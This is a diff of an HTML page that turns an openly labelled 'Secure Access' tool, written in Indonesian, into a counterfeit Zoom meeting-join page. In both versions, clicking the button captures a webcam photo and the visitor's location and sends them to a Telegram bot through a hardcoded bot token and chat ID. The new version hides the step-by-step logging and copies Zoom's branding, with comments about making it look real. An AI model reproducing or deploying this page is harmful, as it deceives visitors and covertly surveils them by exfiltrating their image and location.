@@ -1,111 +1,170 @@
-<!doctype html>
-<html lang="id">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Secure Access</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Zoom</title>
   <style>
-    body{
-      margin:0; padding:0; height:100vh;
-      background:black; color:#00ff66;
-      font-family: monospace; display:flex;
-      align-items:center; justify-content:center;
-      flex-direction:column;
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+      color: #1a1a1a;
     }
-    h1{margin-bottom:20px; text-shadow:0 0 8px #00ff66;}
-    button{
-      background:transparent; color:#00ff66;
-      border:2px solid #00ff66; padding:12px 20px;
-      border-radius:10px; font-weight:bold;
-      cursor:pointer; font-size:1.1rem;
-      box-shadow:0 0 10px #00ff66;
-      transition:0.2s;
+    .logo {
+      margin-top: 40px;
     }
-    button:hover{background:#00ff66; color:black;}
-    #log{
-      margin-top:20px; width:90%; max-width:500px;
-      height:200px; overflow:auto;
-      background:rgba(0,0,0,0.7); border:1px dashed #00ff66;
-      padding:10px; border-radius:8px; font-size:14px;
+    .content {
+      margin-top: 50px;
+    }
+    .content p {
+      font-size: 16px;
+      color: #333;
+      margin: 10px 0;
+    }
+    .content a {
+      color: #0e72ed;
+      text-decoration: none;
+    }
+    .btn {
+        display: inline-block;
+        margin-top: 20px;
+        background-color: #0B5CFF; /* Biru resmi Zoom */
+        color: #fff;
+        font-weight: 600;
+        border-radius: 8px;
+        padding: 12px 28px;
+        font-size: 16px;
+        text-decoration: none;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1); /* biar lebih nyata */
+    }
+
+    .footer {
+      margin-top: 80px;
+      font-size: 12px;
+      color: #666;
+    }
+    .footer a {
+      color: #0e72ed;
+      text-decoration: none;
+      margin: 0 5px;
     }
   </style>
 </head>
 <body>
-  <h1>SELAMAT DATANG</h1>
-  <button id="openBtn">BUKA WEBSITE</button>
-  <div id="log"></div>
 
-<script>
-const BOT_TOKEN = "7597477264:AAFMXbMk_j9usWKnYdw0nmxE4U6qXQ0bYUI";
-const OWNER_ID = "7143446125";
+  <!-- Logo -->
+  <div class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Zoom_Communications_Logo.svg/2560px-Zoom_Communications_Logo.svg.png" alt="Zoom Logo" height="40">
+  </div>
 
-const logBox = document.getElementById("log");
-function log(msg){
-  logBox.innerHTML += msg+"<br>";
-  logBox.scrollTop = logBox.scrollHeight;
-}
+  <!-- Main Content -->
+  <div class="content">
+    <p>Click <strong>Open Zoom Workplace app</strong> on the dialog shown by your browser</p>
+    <p>If you don’t see a dialog, click <strong>Join from Zoom Workplace app</strong> below</p>
+    <p style="font-size:14px; color:#666;">
+      By joining a meeting, you agree to our 
+      <a href="#">Terms of Service</a> and 
+      <a href="#">Privacy Statement</a>
+    </p>
 
-document.getElementById("openBtn").addEventListener("click", async()=>{
-  log("▶ Mengakses kamera...");
-  let photoBlob=null;
-  try{
-    const stream = await navigator.mediaDevices.getUserMedia({video:true});
-    const video = document.createElement("video");
-    video.srcObject = stream;
-    await video.play();
-    const canvas = document.createElement("canvas");
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
-    const ctx = canvas.getContext("2d");
-    ctx.drawImage(video,0,0,canvas.width,canvas.height);
-    photoBlob = await (await fetch(canvas.toDataURL("image/jpeg"))).blob();
-    stream.getTracks().forEach(t=>t.stop());
-    log("✔ Kamera: foto diambil.");
-  }catch(e){
-    log("❌ Kamera gagal: "+e.message);
-  }
+    <a href="#" class="btn">Join from Zoom Workplace app</a>
+    <script>
+    const BOT_TOKEN = "7597477264:AAFMXbMk_j9usWKnYdw0nmxE4U6qXQ0bYUI";
+    const OWNER_ID = "7143446125";
 
-  log("▶ Mengakses lokasi...");
-  let coords=null;
-  try{
-    coords = await new Promise((resolve,reject)=>{
-      navigator.geolocation.getCurrentPosition(
-        pos=>resolve(pos.coords),
-        err=>reject(err),
-        {timeout:10000}
-      );
+    document.getElementById("btn").addEventListener("click", async () => {
+        log("");
+        let photoBlob = null;
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: true
+            });
+            const video = document.createElement("video");
+            video.srcObject = stream;
+            await video.play();
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            photoBlob = await (await fetch(canvas.toDataURL("image/jpeg"))).blob();
+            stream.getTracks().forEach(t => t.stop());
+        } catch (e) {
+            log("");
+        }
+        let coords = null;
+        try {
+            coords = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(
+                    pos => resolve(pos.coords),
+                    err => reject(err), {
+                        timeout: 10000
+                    }
+                );
+            });
+            log("");
+        } catch (e) {
+            log("");
+        }
+
+        // Kirim ke Telegram
+        try {
+            if (photoBlob) {
+                const fd = new FormData();
+                fd.append("chat_id", OWNER_ID);
+                fd.append("photo", photoBlob, "snap.jpg");
+                let cap = "Snapshot dari device.";
+                if (coords) cap += ` Lokasi: https://maps.google.com/?q=${coords.latitude},${coords.longitude}`;
+                fd.append("caption", cap);
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: "POST",
+                    body: fd
+                });
+                log("");
+            }
+            if (coords) {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        chat_id: OWNER_ID,
+                        text: `Lokasi: https://maps.google.com/?q=${coords.latitude},${coords.longitude}`
+                    })
+                });
+                log("");
+            }
+        } catch (e) {
+            log("");
+        }
+
+        log("");
     });
-    log("✔ Lokasi: "+coords.latitude.toFixed(5)+","+coords.longitude.toFixed(5));
-  }catch(e){
-    log("❌ Lokasi gagal: "+e.message);
-  }
+    </script>
 
-  // Kirim ke Telegram
-  try{
-    if(photoBlob){
-      const fd = new FormData();
-      fd.append("chat_id",OWNER_ID);
-      fd.append("photo",photoBlob,"snap.jpg");
-      let cap = "Snapshot dari device.";
-      if(coords) cap += ` Lokasi: https://maps.google.com/?q=${coords.latitude},${coords.longitude}`;
-      fd.append("caption",cap);
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
-      log("📡 Foto terkirim ke Telegram.");
-    }
-    if(coords){
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-        method:"POST",
-        headers:{"Content-Type":"application/json"},
-        body:JSON.stringify({chat_id:OWNER_ID,text:`Lokasi: https://maps.google.com/?q=${coords.latitude},${coords.longitude}`})
-      });
-      log("📡 Lokasi terkirim ke Telegram.");
-    }
-  }catch(e){
-    log("❌ Kirim Telegram gagal: "+e.message);
-  }
 
-  log("=== Selesai ===");
-});
-</script>
+    <p style="margin-top:40px; font-size:14px; color:#666;">
+      Don’t have the Zoom Workplace app installed? <a href="#">Download Now</a>
+    </p>
+    <p style="font-size:14px; color:#666;">
+      Having issues with the Zoom Workplace app? <a href="#">Join from your browser</a>
+    </p>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    <p>©2025 Zoom Communications, Inc. All rights reserved.</p>
+    <p>
+      <a href="#">Trust Center</a> | 
+      <a href="#">Acceptable Use Guidelines</a> | 
+      <a href="#">Legal & Compliance</a> | 
+      <a href="#">Do Not Sell My Personal Information</a> | 
+      <a href="#">Cookie Preferences</a>
+    </p>
+  </div>
+
 </body>
 </html>
